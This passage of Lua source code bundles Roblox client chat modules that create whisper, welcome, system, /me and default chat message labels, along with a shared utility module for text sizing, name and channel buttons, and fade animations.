		local util = require(script.Parent:WaitForChild("Util"))
		
		function ProcessMessage(message, ChatWindow, ChatSettings)
			if string.sub(message, 1, 4):lower() == "/cls" or string.sub(message, 1, 6):lower() == "/clear" then
				local currentChannel = ChatWindow:GetCurrentChannel()
				if (currentChannel) then
					currentChannel:ClearMessageLog()
				end
				return true
			end
			return false
		end
		
		return {
			[util.KEY_COMMAND_PROCESSOR_TYPE] = util.COMPLETED_MESSAGE_PROCESSOR,
			[util.KEY_PROCESSOR_FUNCTION] = ProcessMessage
		}
		
	end[whisper_message] = function()
		--	// FileName: WhisperMessage.lua
		--	// Written by: TheGamer101
		--	// Description: Create a message label for a whisper chat message.
		
		local PlayersService = game:GetService("Players")
		local LocalPlayer = PlayersService.LocalPlayer
		while not LocalPlayer do
			PlayersService.ChildAdded:wait()
			LocalPlayer = PlayersService.LocalPlayer
		end
		
		local clientChatModules = script.Parent.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		local util = require(script.Parent:WaitForChild("Util"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		
		function CreateMessageLabel(messageData, channelName)
		
			local fromSpeaker = messageData.FromSpeaker
			local speakerDisplayName = messageData.SpeakerDisplayName
			local message = messageData.Message
		
			local extraData = messageData.ExtraData or {}
			local useFont = extraData.Font or ChatSettings.DefaultFont
			local useTextSize = extraData.TextSize or ChatSettings.ChatWindowTextSize
			local useNameColor = extraData.NameColor or ChatSettings.DefaultNameColor
			local useChatColor = extraData.ChatColor or ChatSettings.DefaultMessageColor
			local useChannelColor = extraData.ChannelColor or useChatColor
		
			local formatUseName
		
			if ChatSettings.PlayerDisplayNamesEnabled and messageData.SpeakerDisplayName then
				formatUseName = string.format("[%s]:", speakerDisplayName)
			else
				formatUseName = string.format("[%s]:", fromSpeaker)
			end
		
			local speakerNameSize = util:GetStringTextBounds(formatUseName, useFont, useTextSize)
			local numNeededSpaces = util:GetNumberOfSpaces(formatUseName, useFont, useTextSize) + 1
		
			local BaseFrame, BaseMessage = util:CreateBaseMessage("", useFont, useTextSize, useChatColor)
			local NameButton = util:AddNameButtonToBaseMessage(BaseMessage, useNameColor, formatUseName, fromSpeaker)
			local ChannelButton = nil
		
			if channelName ~= messageData.OriginalChannel then
					local whisperString = messageData.OriginalChannel
					if messageData.FromSpeaker ~= LocalPlayer.Name then
						whisperString = string.format("From %s", messageData.FromSpeaker)
					end
		
					if ChatLocalization.tryLocalize then
						whisperString = ChatLocalization:tryLocalize (whisperString)
					end
		
					local formatChannelName = string.format("{%s}", whisperString)
					ChannelButton = util:AddChannelButtonToBaseMessage(BaseMessage, useChannelColor, formatChannelName, messageData.OriginalChannel)
					NameButton.Position = UDim2.new(0, ChannelButton.Size.X.Offset + util:GetStringTextBounds(" ", useFont, useTextSize).X, 0, 0)
					numNeededSpaces = numNeededSpaces + util:GetNumberOfSpaces(formatChannelName, useFont, useTextSize) + 1
			end
		
			local function UpdateTextFunction(messageObject)
				if messageData.IsFiltered then
					BaseMessage.Text = string.rep(" ", numNeededSpaces) .. messageObject.Message
				else
					local messageLength = messageObject.MessageLengthUtf8 or messageObject.MessageLength
					BaseMessage.Text = string.rep(" ", numNeededSpaces) .. string.rep("_", messageLength)
				end
			end
		
			UpdateTextFunction(messageData)
		
			local function GetHeightFunction(xSize)
				return util:GetMessageHeight(BaseMessage, BaseFrame, xSize)
			end
		
			local FadeParmaters = {}
			FadeParmaters[NameButton] = {
				TextTransparency = {FadedIn = 0, FadedOut = 1},
				TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
			}
		
			FadeParmaters[BaseMessage] = {
				TextTransparency = {FadedIn = 0, FadedOut = 1},
				TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
			}
		
			if ChannelButton then
				FadeParmaters[ChannelButton] = {
					TextTransparency = {FadedIn = 0, FadedOut = 1},
					TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
				}
			end
		
			local FadeInFunction, FadeOutFunction, UpdateAnimFunction = util:CreateFadeFunctions(FadeParmaters)
		
			return {
				[util.KEY_BASE_FRAME] = BaseFrame,
				[util.KEY_BASE_MESSAGE] = BaseMessage,
				[util.KEY_UPDATE_TEXT_FUNC] = UpdateTextFunction,
				[util.KEY_GET_HEIGHT] = GetHeightFunction,
				[util.KEY_FADE_IN] = FadeInFunction,
				[util.KEY_FADE_OUT] = FadeOutFunction,
				[util.KEY_UPDATE_ANIMATION] = UpdateAnimFunction
			}
		end
		
		return {
			[util.KEY_MESSAGE_TYPE] = ChatConstants.MessageTypeWhisper,
			[util.KEY_CREATOR_FUNCTION] = CreateMessageLabel
		}
		
	end[welcome_message] = function()
		--!nocheck
		
		--	// FileName: WelcomeMessage.lua
		--	// Written by: TheGamer101
		--	// Description: Create a message label for a welcome message.
		
		local clientChatModules = script.Parent.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		local util = require(script.Parent:WaitForChild("Util"))
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		
		function CreateWelcomeMessageLabel(messageData, channelName)
			local message = messageData.Message
			if ChatLocalization and ChatLocalization.LocalizeFormattedMessage then
				message = ChatLocalization:LocalizeFormattedMessage(message)
			end
			local extraData = messageData.ExtraData or {}
			local useFont = extraData.Font or ChatSettings.DefaultFont
			local useTextSize = extraData.FontSize or ChatSettings.ChatWindowTextSize
			local useChatColor = extraData.ChatColor or ChatSettings.DefaultMessageColor
			local useChannelColor = extraData.ChannelColor or useChatColor
		
			local BaseFrame, BaseMessage = util:CreateBaseMessage(message, useFont, useTextSize, useChatColor)
			local ChannelButton = nil
		
			if channelName ~= messageData.OriginalChannel then
					local localizedChannelName = messageData.OriginalChannel
					if ChatLocalization.tryLocalize then
						localizedChannelName = ChatLocalization:tryLocalize(messageData.OriginalChannel)
					end
					local formatChannelName = string.format("{%s}", localizedChannelName)
					ChannelButton = util:AddChannelButtonToBaseMessage(BaseMessage, useChannelColor, formatChannelName, messageData.OriginalChannel)
					local numNeededSpaces = util:GetNumberOfSpaces(formatChannelName, useFont, useTextSize) + 1
					BaseMessage.Text = string.rep(" ", numNeededSpaces) .. message
			end
		
			local function GetHeightFunction(xSize)
				return util:GetMessageHeight(BaseMessage, BaseFrame, xSize)
			end
		
			local FadeParmaters = {}
			FadeParmaters[BaseMessage] = {
				TextTransparency = {FadedIn = 0, FadedOut = 1},
				TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
			}
		
			if ChannelButton then
				FadeParmaters[ChannelButton] = {
					TextTransparency = {FadedIn = 0, FadedOut = 1},
					TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
				}
			end
		
			local FadeInFunction, FadeOutFunction, UpdateAnimFunction = util:CreateFadeFunctions(FadeParmaters)
		
			return {
				[util.KEY_BASE_FRAME] = BaseFrame,
				[util.KEY_BASE_MESSAGE] = BaseMessage,
				[util.KEY_UPDATE_TEXT_FUNC] = nil,
				[util.KEY_GET_HEIGHT] = GetHeightFunction,
				[util.KEY_FADE_IN] = FadeInFunction,
				[util.KEY_FADE_OUT] = FadeOutFunction,
				[util.KEY_UPDATE_ANIMATION] = UpdateAnimFunction
			}
		end
		
		return {
			[util.KEY_MESSAGE_TYPE] = ChatConstants.MessageTypeWelcome,
			[util.KEY_CREATOR_FUNCTION] = CreateWelcomeMessageLabel
		}
		
	end[util_2] = function()
		--	// FileName: Util.lua
		--	// Written by: Xsitsu, TheGamer101
		--	// Description: Module for shared code between MessageCreatorModules.
		
		--[[
		Creating a message creator module:
		1) Create a new module inside the MessageCreatorModules folder.
		2) Create a function that takes a messageData object and returns:
		{
			KEY_BASE_FRAME = BaseFrame,
			KEY_BASE_MESSAGE = BaseMessage,
			KEY_UPDATE_TEXT_FUNC = function(newMessageObject) ---Function to update the text of the message.
			KEY_GET_HEIGHT = function() ---Function to get the height of the message in absolute pixels,
			KEY_FADE_IN = function(duration, CurveUtil) ---Function to tell the message to start fading in.
			KEY_FADE_OUT = function(duration, CurveUtil) ---Function to tell the message to start fading out.
			KEY_UPDATE_ANIMATION = function(dtScale, CurveUtil) ---Update animation function.
		}
		3) return the following format from the module:
		{
			KEY_MESSAGE_TYPE = "Message type this module creates messages for."
			KEY_CREATOR_FUNCTION = YourFunctionHere
		}
		--]]
		
		local DEFAULT_MESSAGE_CREATOR = "UnknownMessage"
		local MESSAGE_CREATOR_MODULES_VERSION = 1
		---Creator Module Object Keys
		local KEY_MESSAGE_TYPE = "MessageType"
		local KEY_CREATOR_FUNCTION = "MessageCreatorFunc"
		---Creator function return object keys
		local KEY_BASE_FRAME = "BaseFrame"
		local KEY_BASE_MESSAGE = "BaseMessage"
		local KEY_UPDATE_TEXT_FUNC = "UpdateTextFunction"
		local KEY_GET_HEIGHT = "GetHeightFunction"
		local KEY_FADE_IN = "FadeInFunction"
		local KEY_FADE_OUT = "FadeOutFunction"
		local KEY_UPDATE_ANIMATION = "UpdateAnimFunction"
		
		local TextService = game:GetService("TextService")
		
		local Players = game:GetService("Players")
		local LocalPlayer = Players.LocalPlayer
		while not LocalPlayer do
			Players.ChildAdded:wait()
			LocalPlayer = Players.LocalPlayer
		end
		
		local clientChatModules = script.Parent.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		
		local module = {}
		local methods = {}
		methods.__index = methods
		
		function methods:GetStringTextBounds(text, font, textSize, sizeBounds)
			sizeBounds = sizeBounds or Vector2.new(10000, 10000)
			return TextService:GetTextSize(text, textSize, font, sizeBounds)
		end
		--// Above was taken directly from Util.GetStringTextBounds() in the old chat corescripts.
		
		function methods:GetMessageHeight(BaseMessage, BaseFrame, xSize)
			xSize = xSize or BaseFrame.AbsoluteSize.X
			local textBoundsSize = self:GetStringTextBounds(BaseMessage.Text, BaseMessage.Font, BaseMessage.TextSize, Vector2.new(xSize, 1000))
			if textBoundsSize.Y ~= math.floor(textBoundsSize.Y) then
				-- HACK Alert. TODO: Remove this when we switch UDim2 to use float Offsets
				-- This is nessary due to rounding issues on mobile devices when translating between screen pixels and native pixels
				return textBoundsSize.Y + 1
			end
			return textBoundsSize.Y
		end
		
		function methods:GetNumberOfSpaces(str, font, textSize)
			local strSize = self:GetStringTextBounds(str, font, textSize)
			local singleSpaceSize = self:GetStringTextBounds(" ", font, textSize)
			return math.ceil(strSize.X / singleSpaceSize.X)
		end
		
		function methods:CreateBaseMessage(message, font, textSize, chatColor)
			local BaseFrame = self:GetFromObjectPool("Frame")
			BaseFrame.Selectable = false
			BaseFrame.Size = UDim2.new(1, 0, 0, 18)
			BaseFrame.Visible = true
			BaseFrame.BackgroundTransparency = 1
		
			local messageBorder = 8
		
			local BaseMessage = self:GetFromObjectPool("TextLabel")
			BaseMessage.Selectable = false
			BaseMessage.Size = UDim2.new(1, -(messageBorder + 6), 1, 0)
			BaseMessage.Position = UDim2.new(0, messageBorder, 0, 0)
			BaseMessage.BackgroundTransparency = 1
			BaseMessage.Font = font
			BaseMessage.TextSize = textSize
			BaseMessage.TextXAlignment = Enum.TextXAlignment.Left
			BaseMessage.TextYAlignment = Enum.TextYAlignment.Top
			BaseMessage.TextTransparency = 0
			BaseMessage.TextStrokeTransparency = 0.75
			BaseMessage.TextColor3 = chatColor
			BaseMessage.TextWrapped = true
			BaseMessage.ClipsDescendants = true
			BaseMessage.Text = message
			BaseMessage.Visible = true
			BaseMessage.Parent = BaseFrame
		
			return BaseFrame, BaseMessage
		end
		
		function methods:AddNameButtonToBaseMessage(BaseMessage, nameColor, formatName, playerName)
			local speakerNameSize = self:GetStringTextBounds(formatName, BaseMessage.Font, BaseMessage.TextSize)
			local NameButton = self:GetFromObjectPool("TextButton")
			NameButton.Selectable = false
			NameButton.Size = UDim2.new(0, speakerNameSize.X, 0, speakerNameSize.Y)
			NameButton.Position = UDim2.new(0, 0, 0, 0)
			NameButton.BackgroundTransparency = 1
			NameButton.Font = BaseMessage.Font
			NameButton.TextSize = BaseMessage.TextSize
			NameButton.TextXAlignment = BaseMessage.TextXAlignment
			NameButton.TextYAlignment = BaseMessage.TextYAlignment
			NameButton.TextTransparency = BaseMessage.TextTransparency
			NameButton.TextStrokeTransparency = BaseMessage.TextStrokeTransparency
			NameButton.TextColor3 = nameColor
			NameButton.Text = formatName
			NameButton.Visible = true
			NameButton.Parent = BaseMessage
		
			local clickedConn = NameButton.MouseButton1Click:connect(function()
				self:NameButtonClicked(NameButton, playerName)
			end)
		
			local changedConn = nil
			changedConn = NameButton.Changed:connect(function(prop)
				if prop == "Parent" then
					clickedConn:Disconnect()
					changedConn:Disconnect()
				end
			end)
		
			return NameButton
		end
		
		function methods:AddChannelButtonToBaseMessage(BaseMessage, channelColor, formatChannelName, channelName)
			local channelNameSize = self:GetStringTextBounds(formatChannelName, BaseMessage.Font, BaseMessage.TextSize)
			local ChannelButton = self:GetFromObjectPool("TextButton")
			ChannelButton.Selectable = false
			ChannelButton.Size = UDim2.new(0, channelNameSize.X, 0, channelNameSize.Y)
			ChannelButton.Position = UDim2.new(0, 0, 0, 0)
			ChannelButton.BackgroundTransparency = 1
			ChannelButton.Font = BaseMessage.Font
			ChannelButton.TextSize = BaseMessage.TextSize
			ChannelButton.TextXAlignment = BaseMessage.TextXAlignment
			ChannelButton.TextYAlignment = BaseMessage.TextYAlignment
			ChannelButton.TextTransparency = BaseMessage.TextTransparency
			ChannelButton.TextStrokeTransparency = BaseMessage.TextStrokeTransparency
			ChannelButton.TextColor3 = channelColor
			ChannelButton.Text = formatChannelName
			ChannelButton.Visible = true
			ChannelButton.Parent = BaseMessage
		
			local clickedConn = ChannelButton.MouseButton1Click:connect(function()
				self:ChannelButtonClicked(ChannelButton, channelName)
			end)
		
			local changedConn = nil
		 	changedConn = ChannelButton.Changed:connect(function(prop)
				if prop == "Parent" then
					clickedConn:Disconnect()
					changedConn:Disconnect()
				end
			end)
		
			return ChannelButton
		end
		
		function methods:AddTagLabelToBaseMessage(BaseMessage, tagColor, formatTagText)
			local tagNameSize = self:GetStringTextBounds(formatTagText, BaseMessage.Font, BaseMessage.TextSize)
			local TagLabel = self:GetFromObjectPool("TextLabel")
			TagLabel.Selectable = false
			TagLabel.Size = UDim2.new(0, tagNameSize.X, 0, tagNameSize.Y)
			TagLabel.Position = UDim2.new(0, 0, 0, 0)
			TagLabel.BackgroundTransparency = 1
			TagLabel.Font = BaseMessage.Font
			TagLabel.TextSize = BaseMessage.TextSize
			TagLabel.TextXAlignment = BaseMessage.TextXAlignment
			TagLabel.TextYAlignment = BaseMessage.TextYAlignment
			TagLabel.TextTransparency = BaseMessage.TextTransparency
			TagLabel.TextStrokeTransparency = BaseMessage.TextStrokeTransparency
			TagLabel.TextColor3 = tagColor
			TagLabel.Text = formatTagText
			TagLabel.Visible = true
			TagLabel.Parent = BaseMessage
		
			return TagLabel
		end
		
		function GetWhisperChannelPrefix()
			if ChatConstants.WhisperChannelPrefix then
				return ChatConstants.WhisperChannelPrefix
			end
			return "To "
		end
		
		function methods:NameButtonClicked(nameButton, playerName)
			if not self.ChatWindow then
				return
			end
		
			if ChatSettings.ClickOnPlayerNameToWhisper then
				local player = Players:FindFirstChild(playerName)
				if player and player ~= LocalPlayer then
					local whisperChannel = GetWhisperChannelPrefix() ..playerName
					if self.ChatWindow:GetChannel(whisperChannel) then
						self.ChatBar:ResetCustomState()
						local targetChannelName = self.ChatWindow:GetTargetMessageChannel()
						if targetChannelName ~= whisperChannel then
							self.ChatWindow:SwitchCurrentChannel(whisperChannel)
						end
		
						local whisperMessage = "/w " ..playerName
						self.ChatBar:SetText(whisperMessage)
		
						self.ChatBar:CaptureFocus()
					elseif not self.ChatBar:IsInCustomState() then
						local whisperMessage = "/w " ..playerName
						self.ChatBar:SetText(whisperMessage)
		
						self.ChatBar:CaptureFocus()
					end
				end
			end
		end
		
		function methods:ChannelButtonClicked(channelButton, channelName)
			if not self.ChatWindow then
				return
			end
		
			if ChatSettings.ClickOnChannelNameToSetMainChannel then
				if self.ChatWindow:GetChannel(channelName) then
					self.ChatBar:ResetCustomState()
					local targetChannelName = self.ChatWindow:GetTargetMessageChannel()
					if targetChannelName ~= channelName then
						self.ChatWindow:SwitchCurrentChannel(channelName)
					end
					self.ChatBar:ResetText()
					self.ChatBar:CaptureFocus()
				end
			end
		end
		
		function methods:RegisterChatWindow(chatWindow)
			self.ChatWindow = chatWindow
			self.ChatBar = chatWindow:GetChatBar()
		end
		
		function methods:GetFromObjectPool(className)
			if self.ObjectPool == nil then
				return Instance.new(className)
			end
			return self.ObjectPool:GetInstance(className)
		end
		
		function methods:RegisterObjectPool(objectPool)
			self.ObjectPool = objectPool
		end
		
		-- CreateFadeFunctions usage:
		-- fadeObjects is a map of text labels and button to start and end values for a given property.
		-- e.g {
		--   NameButton = {
		--     TextTransparency = {
		--       FadedIn = 0.5,
		--       FadedOut = 1,
		--     }
		--   },
		--  ImageOne = {
		--	  ImageTransparency = {
		--       FadedIn = 0,
		--       FadedOut = 0.5,
		--     }
		--   }
		-- }
		function methods:CreateFadeFunctions(fadeObjects)
			local AnimParams = {}
			for object, properties in pairs(fadeObjects) do
				AnimParams[object] = {}
				for property, values in pairs(properties) do
					AnimParams[object][property] = {
						Target = values.FadedIn,
						Current = object[property],
						NormalizedExptValue = 1,
					}
				end
			end
		
			local function FadeInFunction(duration, CurveUtil)
				for object, properties in pairs(AnimParams) do
					for property, values in pairs(properties) do
						values.Target = fadeObjects[object][property].FadedIn
						values.NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
					end
				end
			end
		
			local function FadeOutFunction(duration, CurveUtil)
				for object, properties in pairs(AnimParams) do
					for property, values in pairs(properties) do
						values.Target = fadeObjects[object][property].FadedOut
						values.NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
					end
				end
			end
		
			local function AnimGuiObjects()
				for object, properties in pairs(AnimParams) do
					for property, values in pairs(properties) do
						object[property] = values.Current
					end
				end
			end
		
			local function UpdateAnimFunction(dtScale, CurveUtil)
				for object, properties in pairs(AnimParams) do
					for property, values in pairs(properties) do
						values.Current = CurveUtil:Expt(
							values.Current,
							values.Target,
							values.NormalizedExptValue,
							dtScale
						)
					end
				end
		
				AnimGuiObjects()
			end
		
			return FadeInFunction, FadeOutFunction, UpdateAnimFunction
		end
		
		function methods:NewBindableEvent(name)
			local bindable = Instance.new("BindableEvent")
			bindable.Name = name
			return bindable
		end
		
		--- DEPRECATED METHODS:
		function methods:RegisterGuiRoot()
			-- This is left here for compatibility with ChatScript versions lower than 0.5
		end
		--- End of Deprecated methods.
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.ObjectPool = nil
			obj.ChatWindow = nil
		
			obj.DEFAULT_MESSAGE_CREATOR = DEFAULT_MESSAGE_CREATOR
			obj.MESSAGE_CREATOR_MODULES_VERSION = MESSAGE_CREATOR_MODULES_VERSION
		
			obj.KEY_MESSAGE_TYPE = KEY_MESSAGE_TYPE
			obj.KEY_CREATOR_FUNCTION = KEY_CREATOR_FUNCTION
		
			obj.KEY_BASE_FRAME = KEY_BASE_FRAME
			obj.KEY_BASE_MESSAGE = KEY_BASE_MESSAGE
			obj.KEY_UPDATE_TEXT_FUNC = KEY_UPDATE_TEXT_FUNC
			obj.KEY_GET_HEIGHT = KEY_GET_HEIGHT
			obj.KEY_FADE_IN = KEY_FADE_IN
			obj.KEY_FADE_OUT = KEY_FADE_OUT
			obj.KEY_UPDATE_ANIMATION = KEY_UPDATE_ANIMATION
		
			return obj
		end
		
		return module.new()
		
	end[unknown_message] = function()
		--	// FileName: UnknownMessage.lua
		--	// Written by: TheGamer101
		--	// Description: Default handler for message types with no other creator registered.
		--	// Just print that there was a message with no creator for now.
		
		local MESSAGE_TYPE = "UnknownMessage"
		
		local clientChatModules = script.Parent.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local util = require(script.Parent:WaitForChild("Util"))
		
		function CreateUnknownMessageLabel(messageData)
			print("No message creator for message: " ..messageData.Message)
		end
		
		return {
			[util.KEY_MESSAGE_TYPE] = MESSAGE_TYPE,
			[util.KEY_CREATOR_FUNCTION] = CreateUnknownMessageLabel
		}
		
	end[system_message] = function()
		--	// FileName: SystemMessage.lua
		--	// Written by: TheGamer101
		--	// Description: Create a message label for a system message.
		
		local clientChatModules = script.Parent.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		local util = require(script.Parent:WaitForChild("Util"))
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		
		function CreateSystemMessageLabel(messageData, channelName)
			local message = messageData.Message
			if ChatLocalization and ChatLocalization.LocalizeFormattedMessage then
				message = ChatLocalization:LocalizeFormattedMessage(message)
			end
			local extraData = messageData.ExtraData or {}
			local useFont = extraData.Font or ChatSettings.DefaultFont
			local useTextSize = extraData.TextSize or ChatSettings.ChatWindowTextSize
			local useChatColor = extraData.ChatColor or ChatSettings.DefaultMessageColor
			local useChannelColor = extraData.ChannelColor or useChatColor
		
			local BaseFrame, BaseMessage = util:CreateBaseMessage(message, useFont, useTextSize, useChatColor)
			BaseMessage.AutoLocalize = true
			local ChannelButton = nil
		
			if channelName ~= messageData.OriginalChannel then
				local formatChannelName
				if ChatLocalization and messageData.OriginalChannel == "System" then
					local localizedChannelName = ChatLocalization:Get("InGame.Chat.Label.SystemMessagePrefix", "System")
					formatChannelName = string.format("{%s}", localizedChannelName)
				elseif ChatLocalization and messageData.OriginalChannel == "Team" then
					local localizedChannelName = ChatLocalization:Get("InGame.Chat.Label.TeamMessagePrefix", "System")
					formatChannelName = string.format("{%s}", localizedChannelName)
				else
					formatChannelName = string.format("{%s}", messageData.OriginalChannel)
				end
				ChannelButton = util:AddChannelButtonToBaseMessage(BaseMessage, useChannelColor, formatChannelName, messageData.OriginalChannel)
				local numNeededSpaces = util:GetNumberOfSpaces(formatChannelName, useFont, useTextSize) + 1
				BaseMessage.Text = string.rep(" ", numNeededSpaces) .. message
			end
		
			local function GetHeightFunction(xSize)
				return util:GetMessageHeight(BaseMessage, BaseFrame, xSize)
			end
		
			local FadeParmaters = {}
			FadeParmaters[BaseMessage] = {
				TextTransparency = {FadedIn = 0, FadedOut = 1},
				TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
			}
		
			if ChannelButton then
				FadeParmaters[ChannelButton] = {
					TextTransparency = {FadedIn = 0, FadedOut = 1},
					TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
				}
			end
		
			local FadeInFunction, FadeOutFunction, UpdateAnimFunction = util:CreateFadeFunctions(FadeParmaters)
		
			return {
				[util.KEY_BASE_FRAME] = BaseFrame,
				[util.KEY_BASE_MESSAGE] = BaseMessage,
				[util.KEY_UPDATE_TEXT_FUNC] = nil,
				[util.KEY_GET_HEIGHT] = GetHeightFunction,
				[util.KEY_FADE_IN] = FadeInFunction,
				[util.KEY_FADE_OUT] = FadeOutFunction,
				[util.KEY_UPDATE_ANIMATION] = UpdateAnimFunction
			}
		end
		
		return {
			[util.KEY_MESSAGE_TYPE] = ChatConstants.MessageTypeSystem,
			[util.KEY_CREATOR_FUNCTION] = CreateSystemMessageLabel
		}
		
	end[set_core_message] = function()
		--	// FileName: SetCoreMessage.lua
		--	// Written by: TheGamer101
		--	// Description: Create a message label for a message created with SetCore(ChatMakeSystemMessage).
		
		local clientChatModules = script.Parent.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		local util = require(script.Parent:WaitForChild("Util"))
		
		function CreateSetCoreMessageLabel(messageData, channelName)
			local message = messageData.Message
			local extraData = messageData.ExtraData or {}
			local useFont = extraData.Font or ChatSettings.DefaultFont
			local useTextSize = extraData.TextSize or ChatSettings.ChatWindowTextSize
			local useColor = extraData.Color or ChatSettings.DefaultMessageColor
		
			local BaseFrame, BaseMessage = util:CreateBaseMessage(message, useFont, useTextSize, useColor)
		
			local function GetHeightFunction(xSize)
				return util:GetMessageHeight(BaseMessage, BaseFrame, xSize)
			end
		
			local FadeParmaters = {}
			FadeParmaters[BaseMessage] = {
				TextTransparency = {FadedIn = 0, FadedOut = 1},
				TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
			}
		
			local FadeInFunction, FadeOutFunction, UpdateAnimFunction = util:CreateFadeFunctions(FadeParmaters)
		
			return {
				[util.KEY_BASE_FRAME] = BaseFrame,
				[util.KEY_BASE_MESSAGE] = BaseMessage,
				[util.KEY_UPDATE_TEXT_FUNC] = nil,
				[util.KEY_GET_HEIGHT] = GetHeightFunction,
				[util.KEY_FADE_IN] = FadeInFunction,
				[util.KEY_FADE_OUT] = FadeOutFunction,
				[util.KEY_UPDATE_ANIMATION] = UpdateAnimFunction
			}
		end
		
		return {
			[util.KEY_MESSAGE_TYPE] = ChatConstants.MessageTypeSetCore,
			[util.KEY_CREATOR_FUNCTION] = CreateSetCoreMessageLabel
		}
		
	end[me_commandmessage] = function()
		--	// FileName: MeCommandMessage.lua
		--	// Written by: TheGamer101
		--	// Description: Create a message label for a me command message.
		
		local clientChatModules = script.Parent.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		local util = require(script.Parent:WaitForChild("Util"))
		
		function CreateMeCommandMessageLabel(messageData, channelName)
			local message = messageData.Message
			local extraData = messageData.ExtraData or {}
			local useFont = extraData.Font or Enum.Font.SourceSansItalic
			local useTextSize = extraData.TextSize or ChatSettings.ChatWindowTextSize
			local useChatColor = Color3.new(1, 1, 1)
			local useChannelColor = extraData.ChannelColor or useChatColor
			local numNeededSpaces = 0
		
			local BaseFrame, BaseMessage = util:CreateBaseMessage("", useFont, useTextSize, useChatColor)
			local ChannelButton = nil
		
			if channelName ~= messageData.OriginalChannel then
				local formatChannelName = string.format("{%s}", messageData.OriginalChannel)
				ChannelButton = util:AddChannelButtonToBaseMessage(BaseMessage, useChannelColor, formatChannelName, messageData.OriginalChannel)
				numNeededSpaces = util:GetNumberOfSpaces(formatChannelName, useFont, useTextSize) + 1
			end
		
			local function UpdateTextFunction(messageObject)
				if messageData.IsFiltered then
					BaseMessage.Text = string.rep(" ", numNeededSpaces) .. messageObject.FromSpeaker .. " " .. string.sub(messageObject.Message, 5)
				else
					local messageLength = messageObject.MessageLengthUtf8 or messageObject.MessageLength
					local formattedMessageLength = utf8.len(utf8.nfcnormalize(messageObject.FromSpeaker)) + messageLength - 4
					BaseMessage.Text = string.rep(" ", numNeededSpaces) .. string.rep("_", formattedMessageLength)
				end
			end
		
			UpdateTextFunction(messageData)
		
			local function GetHeightFunction(xSize)
				return util:GetMessageHeight(BaseMessage, BaseFrame, xSize)
			end
		
			local FadeParmaters = {}
			FadeParmaters[BaseMessage] = {
				TextTransparency = {FadedIn = 0, FadedOut = 1},
				TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
			}
		
			if ChannelButton then
				FadeParmaters[ChannelButton] = {
					TextTransparency = {FadedIn = 0, FadedOut = 1},
					TextStrokeTransparency = {FadedIn = 0.75, FadedOut = 1}
				}
			end
		
			local FadeInFunction, FadeOutFunction, UpdateAnimFunction = util:CreateFadeFunctions(FadeParmaters)
		
			return {
				[util.KEY_BASE_FRAME] = BaseFrame,
				[util.KEY_BASE_MESSAGE] = BaseMessage,
				[util.KEY_UPDATE_TEXT_FUNC] = UpdateTextFunction,
				[util.KEY_GET_HEIGHT] = GetHeightFunction,
				[util.KEY_FADE_IN] = FadeInFunction,
				[util.KEY_FADE_OUT] = FadeOutFunction,
				[util.KEY_UPDATE_ANIMATION] = UpdateAnimFunction
			}
		end
		
		return {
			[util.KEY_MESSAGE_TYPE] = ChatConstants.MessageTypeMeCommand,
			[util.KEY_CREATOR_FUNCTION] = CreateMeCommandMessageLabel
		}
		
	end[default_chat_message] = function()
		--	// FileName: DefaultChatMessage.lua
		--	// Written by: TheGamer101
		--	// Description: Create a message label for a standard chat message.
		
		local clientChatModules = script.Parent.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		local util = require(script.Parent:WaitForChild("Util"))
		
		function CreateMessageLabel(messageData, channelName)
		
			local fromSpeaker = messageData.FromSpeaker
			local speakerName
		
			if ChatSettings.PlayerDisplayNamesEnabled and messageData.SpeakerDisplayName then
				speakerName = messageData.SpeakerDisplayName
			else
				speakerName = fromSpeaker
			end
		
			local message = messageData.Message
		
			local extraData = messageData.ExtraData or {}
			local useFont = extraData.Font or ChatSettings.DefaultFont
			local useTextSize = extraData.TextSize or ChatSettings.ChatWindowTextSize
			local useNameColor = extraData.NameColor or ChatSettings.DefaultNameColor
			local useChatColor = extraData.ChatColor or ChatSettings.DefaultMessageColor
			local useChannelColor = extraData.ChannelColor or useChatColor
			local tags = extraData.Tags or {}
		
			local formatUseName = string.format("[%s]:", speakerName)
			local speakerNameSize = util:GetStringTextBounds(formatUseName, useFont, useTextSize)
			local numNeededSpaces = util:GetNumberOfSpaces(formatUseName, useFont, useTextSize) + 1
		
			local BaseFrame, BaseMessage = util:CreateBaseMessage("", useFont, useTextSize, useChatColor)
			local NameButton = util:AddNameButtonToBaseMessage(BaseMessage, useNameColor, formatUseName, fromSpeaker)
			local ChannelButton = nil
		
